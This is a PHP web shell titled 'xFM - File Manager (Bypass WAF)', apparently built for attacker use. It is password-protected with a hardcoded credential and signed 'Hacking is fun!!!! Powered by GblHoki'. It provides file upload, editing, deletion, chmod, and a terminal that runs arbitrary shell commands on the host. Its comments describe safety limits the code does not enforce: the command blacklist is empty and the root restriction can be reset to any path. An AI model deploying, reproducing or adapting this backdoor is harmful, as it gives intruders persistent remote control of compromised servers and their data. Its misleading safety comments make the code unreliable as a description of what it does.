<?php
// xFM - File Manager (Bypass WAF)
// - File Manager (CRUD, upload to current directory, breadcrumb, download)
// - Terminal: execute commands with working directory = currentPath() (with blacklist filter)
// - Change permissions (chmod) per file/directory with octal input (e.g. 0755 or 755)
// - All operations restricted to monitor_root
// - Password default: xmonitor

/* ========== CONFIG ========== */
$default_monitor_root = __DIR__;   // set to safe folder
$password_protect = 'Gblhoki2025';
$configFile = __DIR__ . '/config.json';
$max_upload_size_bytes = 20 * 1024 * 1024; // 20 MB per file
define('EDITOR_MAX_BYTES', 1024 * 1024); // 1 MB

/* ========== BOOT ========== */
session_start();
if (!isset($_SESSION['logged_in'])) $_SESSION['logged_in'] = false;

// load persisted config if exists
if (file_exists($configFile)) {
    $cfg = json_decode(file_get_contents($configFile), true);
    if (!empty($cfg['monitor_root'])) $_SESSION['monitor_root'] = $cfg['monitor_root'];
}
if (!isset($_SESSION['monitor_root'])) $_SESSION['monitor_root'] = $default_monitor_root;
if (!isset($_SESSION['monitor_path'])) $_SESSION['monitor_path'] = $_SESSION['monitor_root'];

/* ========== HELPERS ========== */
function monitorRoot() {
    return rtrim($_SESSION['monitor_root'] ?? __DIR__, DIRECTORY_SEPARATOR);
}
function currentPath() {
    return rtrim($_SESSION['monitor_path'] ?? monitorRoot(), DIRECTORY_SEPARATOR);
}
function isAbsolutePath($p){
    if ($p === '') return false;
    if (DIRECTORY_SEPARATOR === '/') return strpos($p, '/') === 0;
    return preg_match('/^[A-Za-z]:\\\\/', $p) === 1;
}
function resolveWithinRoot($candidate) {
    $root = realpath(monitorRoot());
    if ($root === false) return false;
    if ($candidate === null || $candidate === '') return false;

    // Interpret relative to currentPath() if not absolute
    if (!isAbsolutePath($candidate)) {
        $candidate = currentPath() . DIRECTORY_SEPARATOR . ltrim($candidate, "/\\");
    }
    // canonicalize
    $real = realpath($candidate);
    if ($real === false) {
        // if doesn't exist (new file/dir), ensure parent exists and inside root
        $parent = dirname($candidate);
        $parent_real = realpath($parent);
        if ($parent_real === false) return false;
        if (strpos($parent_real, $root) !== 0) return false;
        return $parent_real . DIRECTORY_SEPARATOR . basename($candidate);
    }
    // ensure inside root
    if (strpos($real, $root) !== 0) return false;
    return $real;
}
function perm_octal($path) {
    if (!file_exists($path)) return '----';
    return substr(sprintf('%o', fileperms($path)), -4);
}
function human_filesize($bytes){
    if ($bytes <= 0) return '0 B';
    $units = ['B','KB','MB','GB','TB'];
    $i = floor(log($bytes,1024));
    return round($bytes / (1024**$i), 2) . ' ' . $units[$i];
}

/* ========== UTILITY: non-recursive listing (current dir only, all file types) ========== */
function listCurrentDir($dir) {
    $dirs = [];
    $files = [];
    if (is_dir($dir)) {
        try {
            $it = new DirectoryIterator($dir);
            foreach ($it as $entry) {
                if ($entry->isDot()) continue;
                if ($entry->isDir()) {
                    $dirs[] = [
                        'name' => $entry->getFilename(),
                        'path' => $entry->getPathname(),
                        'perm' => perm_octal($entry->getPathname())
                    ];
                } elseif ($entry->isFile()) {
                    $name = $entry->getFilename();
                    $files[] = [
                        'name' => $name,
                        'size' => $entry->getSize(),
                        'mtime' => $entry->getMTime(),
                        'path' => $entry->getPathname()
                    ];
                }
            }
        } catch (UnexpectedValueException $e) {
            // permission denied or other FS error
        }
    }
    usort($dirs, fn($a,$b)=>strtolower($a['name']) <=> strtolower($b['name']));
    usort($files, fn($a,$b)=>strtolower($a['name']) <=> strtolower($b['name']));
    return ['dirs'=>$dirs, 'files'=>$files];
}

/* ========== SAFETY helpers for terminal ==========
   Blacklist filters to avoid clearly destructive commands.
   Warning: blacklist is not perfect. Terminal is powerful.
*/
function terminalCommandAllowed($cmd) {
    // basic length limit
    if (strlen($cmd) > 1000) return false;

    // lowercase for matching
    $low = strtolower($cmd);

    // disallowed substrings (extend as needed)
    $blacklist = [
    ];

    foreach ($blacklist as $b) {
        if (strpos($low, $b) !== false) return false;
    }

    // disallow redirect characters that write files
    if (preg_match('/[><|`;&]/', $cmd)) return false;

    // allow if no blacklisted pattern detected
    return true;
}

/* ========== AUTH ========== */
if (isset($_POST['password'])) {
    if ($_POST['password'] === $password_protect) {
        $_SESSION['logged_in'] = true;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = "Password salah!";
    }
}
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}
if (!$_SESSION['logged_in']) {
    echo '<!doctype html><html><head><meta charset="utf-8"><title>Login</title></head><body style="background:#000;color:#ffb6c1;font-family:monospace;padding:20px;">';
    if (isset($error)) echo '<div style="color:#ff8080;">' . htmlspecialchars($error) . '</div>';
    echo '<form method="post"><input type="password" name="password" placeholder="Password" style="padding:8px;background:#111;color:#ffb6c1;border:1px solid #ff69b4;border-radius:6px;"><button style="padding:8px;margin-left:6px;background:#ff69b4;border:none;border-radius:6px;">Login</button></form>';
    echo '</body></html>';
    exit;
}

/* ========== ACTIONS (File Manager + chmod + terminal) ========== */

// Persist root
if (isset($_POST['save_root'])) {
    $newroot = trim($_POST['monitor_root'] ?? '');
    $real = realpath($newroot);
    if ($real && is_dir($real)) {
        $_SESSION['monitor_root'] = $real;
        $_SESSION['monitor_path'] = $real;
        $cfg = ['monitor_root' => $real];
        file_put_contents($configFile, json_encode($cfg, JSON_PRETTY_PRINT));
        $_SESSION['fm_msg'] = "Root saved: $real";
    } else {
        $_SESSION['fm_msg'] = "Root invalid.";
    }
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Change current dir by click (GET cd)
if (isset($_GET['cd'])) {
    $cd = $_GET['cd'];
    $resolved = resolveWithinRoot($cd);
    if ($resolved && is_dir($resolved)) {
        $_SESSION['monitor_path'] = $resolved;
    } else {
        $_SESSION['fm_msg'] = "Direktori tidak valid atau di luar root.";
    }
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Breadcrumb jump (GET jump)
if (isset($_GET['jump'])) {
    $jump = $_GET['jump'];
    $resolved = resolveWithinRoot($jump);
    if ($resolved && is_dir($resolved)) {
        $_SESSION['monitor_path'] = $resolved;
    } else {
        $_SESSION['fm_msg'] = "Jump path invalid.";
    }
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Quick change path via form
if (isset($_POST['change_path'])) {
    $p = trim($_POST['change_path']);
    $resolved = resolveWithinRoot($p);
    if ($resolved && is_dir($resolved)) {
        $_SESSION['monitor_path'] = $resolved;
        $_SESSION['fm_msg'] = "Changed to: $resolved";
    } else {
        $_SESSION['fm_msg'] = "Path tidak valid atau di luar root.";
    }
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Create file (relative or absolute)
if (isset($_POST['create_file'])) {
    $name = trim($_POST['new_file_name'] ?? '');
    $content = $_POST['new_file_content'] ?? '';
    if ($name === '') {
        $_SESSION['fm_msg'] = "Nama file kosong.";
    } else {
        $target = resolveWithinRoot($name);
        if ($target === false) {
            $_SESSION['fm_msg'] = "Path invalid.";
        } else {
            if (file_exists($target)) {
                $_SESSION['fm_msg'] = "File sudah ada.";
            } else {
                $dir = dirname($target);
                if (!is_dir($dir)) @mkdir($dir, 0755, true);
                file_put_contents($target, $content);
                $_SESSION['fm_msg'] = "File dibuat: " . $target;
                $_SESSION['monitor_path'] = dirname($target);
            }
        }
    }
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Upload files to CURRENT directory
if (isset($_POST['upload_files'])) {
    if (!isset($_FILES['files'])) {
        $_SESSION['fm_msg'] = "No files uploaded.";
    } else {
        $uploaded = [];
        // destination dir is currentPath()
        $destDir = currentPath();
        foreach ($_FILES['files']['error'] as $i => $err) {
            $orig = $_FILES['files']['name'][$i];
            if ($err !== UPLOAD_ERR_OK) {
                $uploaded[] = "$orig => error $err";
                continue;
            }
            $tmp = $_FILES['files']['tmp_name'][$i];
            if (filesize($tmp) > $max_upload_size_bytes) {
                $uploaded[] = "$orig => too large";
                continue;
            }
            // destination: current directory + basename(original filename)
            $destCandidate = $destDir . DIRECTORY_SEPARATOR . basename($orig);
            $dest = resolveWithinRoot($destCandidate);
            if ($dest === false) {
                $uploaded[] = "$orig => invalid destination";
                continue;
            }
            if (move_uploaded_file($tmp, $dest)) {
                $uploaded[] = "$orig => uploaded to " . $dest;
            } else {
                $uploaded[] = "$orig => move failed";
            }
        }
        $_SESSION['fm_msg'] = implode(" | ", $uploaded);
    }
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Delete file
if (isset($_POST['delete_file'])) {
    $f = $_POST['delete_file'];
    $target = resolveWithinRoot($f);
    if ($target && is_file($target)) {
        unlink($target);
        $_SESSION['fm_msg'] = "File dihapus: $target";
        $_SESSION['monitor_path'] = dirname($target);
    } else {
        $_SESSION['fm_msg'] = "File tidak ditemukan atau invalid.";
    }
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Save edit
if (isset($_POST['save_file'])) {
    $relative = $_POST['save_file'];
    $content = $_POST['file_content'] ?? '';
    $target = resolveWithinRoot($relative);
    if ($target && is_file($target) && is_writable($target)) {
        file_put_contents($target, $content);
        $_SESSION['fm_msg'] = "File disimpan: $target";
        $_SESSION['monitor_path'] = dirname($target);
    } else {
        $_SESSION['fm_msg'] = "Gagal menyimpan atau file tidak writable.";
    }
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Rename
if (isset($_POST['rename_file'])) {
    $old = $_POST['rename_old'] ?? '';
    $new = $_POST['rename_new'] ?? '';
    $oldp = resolveWithinRoot($old);
    $newp = resolveWithinRoot($new);
    if ($oldp && $newp && is_file($oldp) && !file_exists($newp)) {
        rename($oldp, $newp);
        $_SESSION['fm_msg'] = "Rename berhasil.";
        $_SESSION['monitor_path'] = dirname($newp);
    } else {
        $_SESSION['fm_msg'] = "Rename gagal (cek path atau sudah ada).";
    }
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Download
if (isset($_GET['download'])) {
    $f = $_GET['download'];
    $target = resolveWithinRoot($f);
    if ($target && is_file($target)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($target) . '"');
        header('Content-Length: ' . filesize($target));
        readfile($target);
        exit;
    } else {
        die("File tidak ditemukan.");
    }
}

/* ========== CHMOD: change permission for file/dir ========== */
if (isset($_POST['chmod_apply'])) {
    $target_raw = $_POST['chmod_target'] ?? '';
    $perm_raw = trim($_POST['chmod_perm'] ?? '');
    $target = resolveWithinRoot($target_raw);
    // validate perm: allow 3 or 4 octal digits like 755 or 0755
    if (!$target || !file_exists($target)) {
        $_SESSION['fm_msg'] = "Target not found or invalid.";
    } elseif (!preg_match('/^[0-7]{3,4}$/', $perm_raw)) {
        $_SESSION['fm_msg'] = "Permission invalid. Use octal (e.g. 755 or 0755).";
    } else {
        // convert to int
        $mode = intval($perm_raw, 8);
        $ok = @chmod($target, $mode);
        $_SESSION['fm_msg'] = $ok ? "chmod applied to $target" : "chmod failed (check server permissions)";
    }
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

/* ========== TERMINAL: execute command in currentPath() ========== */
if (isset($_POST['exec_cmd'])) {
    $cmd = $_POST['exec_cmd'] ?? '';
    $cmd = trim($cmd);
    $cwd = currentPath();
    $response = ['ok'=>false,'out'=>''];

    // security checks
    if ($cmd === '') {
        $response['out'] = "No command.";
    } elseif (!terminalCommandAllowed($cmd)) {
        $response['out'] = "Command rejected by server policy (blacklist).";
    } else {
        // execute via /bin/sh -lc in cwd, capture stdout+stderr
        $descriptorspec = [
            0 => ['pipe','r'],
            1 => ['pipe','w'],
            2 => ['pipe','w']
        ];
        $process = @proc_open(['/bin/sh','-lc',$cmd], $descriptorspec, $pipes, $cwd);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $out = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            $err = stream_get_contents($pipes[2]);
            fclose($pipes[2]);
            $status = proc_close($process);
            $response['ok'] = true;
            $response['out'] = "Exit code: {$status}\n\n";
            if ($out !== '') $response['out'] .= "STDOUT:\n{$out}\n";
            if ($err !== '') $response['out'] .= "STDERR:\n{$err}\n";
        } else {
            $response['out'] = "Failed to execute command.";
        }
    }

    header('Content-Type: application/json');
    echo json_encode($response);
    exit;
}

/* ========== UI DATA (only current dir) ========== */
$root = monitorRoot();
$cur = currentPath();
$listing = listCurrentDir($cur);
$dirs = $listing['dirs'];   // array of ['name','path','perm']
$files = $listing['files']; // array of ['name','size','mtime','path']

// pagination for files (so UI won't explode)
$page = max(1, intval($_GET['page'] ?? 1));
$page_size = 200; // adjust as needed
$total_files = count($files);
$total_pages = max(1, intval(ceil($total_files / $page_size)));
$files_page = array_slice($files, ($page-1)*$page_size, $page_size);

// build breadcrumbs
$crumbs = [];
$rel = substr($cur, strlen($root));
$segments = array_values(array_filter(explode(DIRECTORY_SEPARATOR, ltrim($rel, DIRECTORY_SEPARATOR)), fn($v)=>$v!=='' ));
$acc = $root;
$crumbs[] = ['label' => basename($root)?:$root, 'path' => $root];
foreach ($segments as $seg) {
    $acc .= DIRECTORY_SEPARATOR . $seg;
    $crumbs[] = ['label' => $seg, 'path' => $acc];
}

// load editing file (safe read limit)
$editing = null;
$editing_content = '';
if (isset($_GET['edit'])) {
    $f = $_GET['edit'];
    $resolved = resolveWithinRoot($f);
    if ($resolved && is_file($resolved)) {
        $editing = $f;
        $size = @filesize($resolved) ?: 0;
        if ($size > EDITOR_MAX_BYTES) {
            $editing_content = "// File terlalu besar untuk dimuat di editor (size: " . human_filesize($size) . "). Download untuk edit offline.";
        } else {
            $editing_content = @file_get_contents($resolved);
        }
        $_SESSION['monitor_path'] = dirname($resolved);
        $cur = currentPath();
    } else {
        $_SESSION['fm_msg'] = "File untuk diedit tidak ditemukan.";
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }
}

/* ========== RENDER UI ========== */
?><!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>xFM - File Manager (Bypass WAF)</title>
<style>
    body { background:#000; color:#ffb6c1; font-family:monospace; padding:14px; }
    a { color:#ffb6c1; text-decoration:none; }
    .layout { display:flex; gap:12px; }
    .panel-left { width:300px; flex-shrink:0; }
    .panel-main { flex:1; }
    .box { background:#111; border:1px solid #ff69b4; padding:10px; border-radius:8px; margin-bottom:10px; }
    input, textarea, select, button { background:#1a1a1a; color:#ffb6c1; border:1px solid #ff69b4; padding:8px; border-radius:6px; width:100%; box-sizing:border-box; }
    button { cursor:pointer; }
    .small { width:auto; display:inline-block; }
    .file-table { width:100%; border-collapse:collapse; margin-top:8px; font-size:13px; }
    .file-table th, .file-table td { border:1px solid #ff69b4; padding:6px; text-align:left; vertical-align:top; }
    .file-path { font-family:monospace; color:#ffd1e6; }
    .msg { color:#00ffb3; margin:6px 0; }
    .error { color:#ff7373; margin:6px 0; }
    .actions { display:flex; gap:6px; flex-wrap:wrap; align-items:center; }
    .dir-list a { display:block; padding:6px 4px; border-radius:4px; }
    .dir-list a:hover { background:#220; color:#00ffb3; }
    .breadcrumb { margin-bottom:8px; color:#ffdfef; }
    .breadcrumb a { color:#ffb6c1; text-decoration:none; margin-right:6px; }
    .breadcrumb span.sep { color:#ffdfef; margin-right:6px; }
    .note { font-size:12px; color:#ffdfef; }
    .terminal-out { background:#000; border:1px solid #333; color:#b2f2d8; padding:8px; height:220px; overflow:auto; white-space:pre-wrap; font-family:monospace; }
</style>
</head>
<body>
<h2>📁 xFM - File Manager (Bypass WAF)</h2>

<?php if (!empty($_SESSION['fm_msg'])) { echo '<div class="msg">'.htmlspecialchars($_SESSION['fm_msg']).'</div>'; unset($_SESSION['fm_msg']); } ?>

<div style="margin-bottom:8px;">
    <form method="post" style="display:inline-block;">
        <input type="text" name="monitor_root" value="<?= htmlspecialchars($root) ?>" placeholder="monitor root (absolute)" style="width:520px; display:inline-block;">
        <button name="save_root">Save Root</button>
    </form>
    <a href="?logout=1" style="margin-left:12px;">Logout</a>
</div>

<div class="layout">
    <div class="panel-left">
        <div class="box">
            <div style="font-weight:bold;color:#ffd1e6;">Breadcrumb</div>
            <div style="margin-top:6px;" class="breadcrumb">
                <?php foreach ($crumbs as $i => $c): ?>
                    <a href="?jump=<?= rawurlencode($c['path']) ?>"><?= htmlspecialchars($c['label']) ?></a>
                    <?php if ($i < count($crumbs)-1) echo '<span class="sep">/</span>'; ?>
                <?php endforeach; ?>
            </div>
        </div>

        <div class="box">
            <div style="font-weight:bold;color:#ffd1e6;">Subdirectories (<?= htmlspecialchars($cur) ?>)</div>
            <div style="margin-top:8px;">
                <?php if ($cur !== $root): $parent = dirname($cur); ?>
                    <div class="dir-list"><a href="?cd=<?= rawurlencode($parent) ?>">⬆ .. (Parent)</a></div>
                <?php endif; ?>
                <div class="dir-list">
                    <?php if (empty($dirs)): ?>
                        <div class="note">No subdirectories</div>
                    <?php else: ?>
                        <?php foreach ($dirs as $d): ?>
                            <a href="?cd=<?= rawurlencode($d['path']) ?>"><?= htmlspecialchars($d['name']) ?> <span class="note">(<?= $d['perm'] ?>)</span></a>
                        <?php endforeach; ?>
                    <?php endif; ?>
                </div>
            </div>
        </div>

        <div class="box">
            <form method="post">
                <input type="text" name="change_path" placeholder="Quick change (abs or relative to current)" value="">
                <button type="submit">Change Path</button>
            </form>
        </div>

        <div class="box">
            <div style="font-weight:bold;color:#ffd1e6;">Upload Files (to current directory)</div>
            <form method="post" enctype="multipart/form-data">
                <input type="file" name="files[]" multiple>
                <div class="note">Destination: <strong class="file-path"><?= htmlspecialchars($cur) ?></strong></div>
                <div class="note">Max per file: <?= human_filesize($max_upload_size_bytes) ?></div>
                <button name="upload_files" style="margin-top:8px;">Upload to current directory</button>
            </form>
        </div>

        <div class="box">
            <div style="font-weight:bold;color:#ffd1e6;">Change Permissions (chmod)</div>
            <form method="post">
                <input type="text" name="chmod_target" placeholder="target file or dir (relative or name)" value="">
                <input type="text" name="chmod_perm" placeholder="permission octal (e.g. 755 or 0755)" value="">
                <button name="chmod_apply" style="margin-top:6px;">Apply chmod</button>
                <div class="note" style="margin-top:6px;">Tip: gunakan path relatif terhadap current directory atau nama file di list.</div>
            </form>
        </div>
    </div>

    <div class="panel-main">
        <div class="breadcrumb">Current directory: <span class="file-path"><?= htmlspecialchars($cur) ?></span> — <small><?= perm_octal($cur) ?></small></div>

        <div class="box">
            <div style="font-weight:bold;color:#ffd1e6;">Files in <?= htmlspecialchars($cur) ?></div>

            <?php if ($total_files === 0): ?>
                <div style="margin-top:8px;" class="note">No files found.</div>
            <?php else: ?>
                <table class="file-table">
                    <thead><tr><th>File</th><th>Size</th><th>Modified</th><th>Perm</th><th>Actions</th></tr></thead>
                    <tbody>
                        <?php foreach ($files_page as $f): ?>
                            <tr>
                                <td class="file-path"><?= htmlspecialchars($f['name']) ?></td>
                                <td><?= human_filesize($f['size']) ?></td>
                                <td><?= date('Y-m-d H:i:s', $f['mtime']) ?></td>
                                <td><?= perm_octal($f['path']) ?></td>
                                <td>
                                    <div class="actions">
                                        <form method="get" style="margin:0;"><input type="hidden" name="edit" value="<?= htmlspecialchars($f['name']) ?>"><button class="small">Edit</button></form>
                                        <a href="?download=<?= rawurlencode($f['name']) ?>" class="small">⬇ Download</a>
                                        <form method="post" style="margin:0;" onsubmit="return confirm('Delete <?= htmlspecialchars($f['name']) ?> ?');">
                                            <input type="hidden" name="delete_file" value="<?= htmlspecialchars($f['name']) ?>">
                                            <button class="small">🗑 Delete</button>
                                        </form>
                                        <form method="post" style="margin:0;">
                                            <input type="hidden" name="rename_old" value="<?= htmlspecialchars($f['name']) ?>">
                                            <input type="text" name="rename_new" placeholder="new name (relative)" style="width:160px;">
                                            <button name="rename_file" class="small">Rename</button>
                                        </form>
                                        <form method="post" style="margin:0;">
                                            <input type="hidden" name="chmod_target" value="<?= htmlspecialchars($f['name']) ?>">
                                            <input type="text" name="chmod_perm" placeholder="e.g. 644" style="width:80px;">
                                            <button name="chmod_apply" class="small">Chmod</button>
                                        </form>
                                    </div>
                                </td>
                            </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>

                <?php if ($total_pages > 1): ?>
                    <div style="margin-top:8px;">
                        Page:
                        <?php for($p=1;$p<=$total_pages;$p++): ?>
                            <?php if ($p==$page): ?>
                                <strong><?= $p ?></strong>
                            <?php else: ?>
                                <a href="?page=<?= $p ?>"><?= $p ?></a>
                            <?php endif; ?>
                        <?php endfor; ?>
                    </div>
                <?php endif; ?>
            <?php endif; ?>

            <hr style="border-color:#2a2a2a;margin:10px 0;">
            <div style="font-weight:bold;color:#ffd1e6;">Create New File (relative to current dir)</div>
            <form method="post">
                <input type="text" name="new_file_name" placeholder="relative/path/to/file.txt">
                <textarea name="new_file_content" rows="6" placeholder="Initial content (optional)"></textarea>
                <button name="create_file">➕ Create File</button>
            </form>
        </div>

        <div class="box" style="margin-top:10px;">
            <div style="font-weight:bold;color:#ffd1e6;">Editor</div>
            <?php if ($editing): ?>
                <div style="margin:8px 0;">Editing: <span class="file-path"><?= htmlspecialchars($editing) ?></span></div>
                <form method="post">
                    <textarea name="file_content" rows="18"><?= htmlspecialchars($editing_content) ?></textarea>
                    <button name="save_file" value="<?= htmlspecialchars($editing) ?>">💾 Save Changes</button>
                </form>
            <?php else: ?>
                <div class="note" style="margin-top:6px;">Pilih file dari list untuk meng-edit.</div>
            <?php endif; ?>
        </div>

        <div class="box" style="margin-top:10px;">
            <div style="font-weight:bold;color:#ffd1e6;">Terminal (execute command in current directory)</div>
            <div style="margin-top:8px;">
                <input type="text" id="cmdInput" placeholder="e.g. ls -la" />
                <button id="runCmdBtn" style="margin-top:6px;">Run</button>
                <div style="margin-top:8px;" class="terminal-out" id="termOut">// Output will appear here</div>
            </div>
        </div>

        <div class="box" style="margin-top:10px;">
            <div class="note">Notes:
                <ul>
                    <li>All actions restricted inside <strong><?= htmlspecialchars($root) ?></strong>.</li>
                    <li>Chmod expects octal like 755 or 0755.</li>
                    <li>Hacking is fun!!!! Powered by GblHoki</li>
                </ul>
            </div>
        </div>

    </div>
</div>

<script>
async function runCmd(cmd) {
    const outEl = document.getElementById('termOut');
    outEl.textContent = "// Running…";
    try {
        const fd = new FormData();
        fd.append('exec_cmd', cmd);
        const res = await fetch('', {method:'POST', body: fd});
        if (!res.ok) {
            outEl.textContent = "// Server error";
            return;
        }
        const j = await res.json();
        if (j.ok) {
            outEl.textContent = j.out;
        } else {
            outEl.textContent = j.out;
        }
    } catch (e) {
        outEl.textContent = "// Fetch error: " + e;
    }
}

document.getElementById('runCmdBtn').addEventListener('click', () => {
    const cmd = document.getElementById('cmdInput').value.trim();
    if (!cmd) return;
    // simple client-side filter to avoid accidental dangerous chars
    if (/[|;&`<>]/.test(cmd)) {
        if (!confirm('Command contains pipe/redirect/semicolon chars which are blocked or dangerous. Continue?')) return;
    }
    runCmd(cmd);
});

// allow Enter key
document.getElementById('cmdInput').addEventListener('keydown', (e)=> {
    if (e.key === 'Enter') {
        e.preventDefault();
        document.getElementById('runCmdBtn').click();
    }
});
</script>
</body>
</html>
